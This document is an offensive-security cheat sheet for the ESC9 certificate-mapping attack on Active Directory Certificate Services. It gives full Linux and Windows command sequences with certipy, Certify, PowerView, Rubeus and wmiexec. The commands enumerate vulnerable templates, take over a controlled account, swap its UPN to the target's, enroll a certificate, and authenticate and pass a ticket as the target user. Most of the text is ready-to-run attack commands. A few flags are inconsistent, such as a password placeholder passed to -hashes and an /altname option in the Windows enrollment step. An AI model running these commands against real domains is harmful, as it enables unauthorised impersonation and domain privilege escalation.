# ESC9—Certificate Mapping via NoSecurityExtension (CT_FLAG_NO_SECURITY_EXTENSION)

## Theory

> [!Overview] Title
> If an enrollable, client-auth template sets `CT_FLAG_NO_SECURITY_EXTENSION` in `msPKI-Enrollment-Flag`, the CA omits the `szOID_NTDS_CA_SECURITY_EXT`. This bypasses strong certificate-to-account binding even when `StrongCertificateBindingEnforcement=1`, causing mapping to fall back to UPN-only. An attacker with the ability to modify a user’s UPN can set a controlled user’s UPN to the target’s UPN, enroll a cert from the vulnerable template, and receive a cert that maps to the target account.

## Requirements

- `StrongCertificateBindingEnforcement != 2` (default is `1`) **or** `CertificateMappingMethods` includes UPN (`0x4`).
- Vulnerable template has **NoSecurityExtension** (`CT_FLAG_NO_SECURITY_EXTENSION`) and **Client Authentication** EKU.
- Attacker has **GenericWrite/GenericAll** over a user **<CONTROLLED_USER>** to modify its UPN (or reset its password).
- Ability to enroll in the vulnerable template.
 
---

## Linux

### Enumerate

```bash
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
# Look for: Enrollment Flag includes NoSecurityExtension, EKU includes Client Authentication
```

Verify rights over a controllable user:

- With Impacket/PowerView from Linux, or use `dacledit.py` (if available) to confirm `GenericWrite/GenericAll` on `<CONTROLLED_USER>`.

```bash
dacledit.py -action read -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASS>' -principal <USER> -target <TARGET_USER>
```

### Step 1—Gain/use Credentials for <CONTROLLED_USER>

- Either know `<CONTROLLED_USER>`’s creds/hash or set a password / add shadow credentials.

Example (shadow credentials approach):

```bash
certipy shadow auto -u '<USER>@<DOMAIN>' -p '<PASS>' -account <CONTROLLED_USER>
# Produces a TGT/NT hash for <CONTROLLED_USER> without changing their password
```

### Step 2—Set <CONTROLLED_USER> UPN to the target’s UPN

```bash
certipy account update -u '<USER>@<DOMAIN>' -p '<PASS>' \
  -user <CONTROLLED_USER> -upn '<TARGET_UPN>'
```

### Step 3—Request Cert from Vulnerable Template as <CONTROLLED_USER>

(If using NT hash from shadow creds, use `-hashes <NTLM_HASH>` instead of `-p`.)

```bash
certipy req -u '<CONTROLLED_USER>@<DOMAIN>' \
  -hashes '<CONTROLLED_USER_PASSWORD>' \
  -dc-ip <DC_IP> -ca '<CA_NAME>' -template '<TEMPLATE_NAME>' \
  -out '<PFX_FILE>'
# Expect: "Certificate has no object SID" and UPN shows <TARGET_UPN>
```


### Step 4—Revert <CONTROLLED_USER> UPN

```bash
certipy account update -u '<USER>@<DOMAIN>' -p '<PASS>' \
  -user <CONTROLLED_USER> -upn '<CONTROLLED_UPN>'
```

### Step 5—Authenticate as <TARGET_USER>

```bash
certipy auth -pfx '<PFX_FILE>' -domain '<DOMAIN>' -dc-ip <DC_IP>
# Produces <TARGET_USER>.ccache and may return NT hash
```

### Step 6—Use TGT

```bash
KRB5CCNAME=<TARGET_USER>.ccache wmiexec.py -k -no-pass <TARGET_HOST_FQDN>
```

---

## Windows

### Enumerate

```powershell
.\Certify.exe find
# Identify templates with:
#   mspki-enrollment-flag: ... NO_SECURITY_EXTENSION
#   pkiextendedkeyusage / mspki-certificate-application-policy includes Client Authentication
```

Check registry for StrongCertificateBindingEnforcement and CertificateMappingMethods (if you have admin access):

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\Kdc
# StrongCertificateBindingEnforcement must not be 0x2
reg query HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel
# CertificateMappingMethods should be 0x4
```

Find a user you control (GenericWrite/GenericAll):

```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
$me = (Get-DomainUser -Identity '<USER>')
Get-DomainObjectAcl -LDAPFilter "(&(objectClass=user)(objectCategory=person))" -ResolveGUIDs |
  ? { ($_.ActiveDirectoryRights -contains 'GenericAll' -or $_.ActiveDirectoryRights -contains 'GenericWrite') -and $_.SecurityIdentifier -eq $me.objectsid }
```

Or use BloodHound.

### Step 1—Get or Set Creds for <CONTROLLED_USER>

```powershell
# If you have rights:
Set-DomainUserPassword -Identity <CONTROLLED_USER> -AccountPassword (ConvertTo-SecureString 'StrongPass123!' -AsPlainText -Force)
```

### Step 2—Set <CONTROLLED_USER> UPN to <TARGET_UPN>

```powershell
Set-DomainObject <CONTROLLED_USER> -Set @{'userPrincipalName'='<TARGET_UPN>'} -Verbose
```

### Step 3—Run as <CONTROLLED_USER> and Enroll (you Need a session/context as that user)

- Use RDP (`xfreerdp`), “Run as different user”, or RunasCS.

```powershell
# In a PowerShell running as <CONTROLLED_USER>:
.\Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:<TARGET_USER> > target.pem
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in target.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out target.pfx
```

### Step 4—Revert <CONTROLLED_USER> UPN

```powershell
Set-DomainObject <CONTROLLED_USER> -Set @{'userPrincipalName'='<CONTROLLED_UPN>'}
```

### Step 5—Authenticate as <TARGET_USER>

```powershell
.\Rubeus.exe asktgt /user:<TARGET_USER> /certificate:target.pfx /getcredentials /nowrap
# => Base64 TGT and possibly NTLM
```

### Step 6—Use Ticket

```powershell
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:<BASE64_TGT>
```
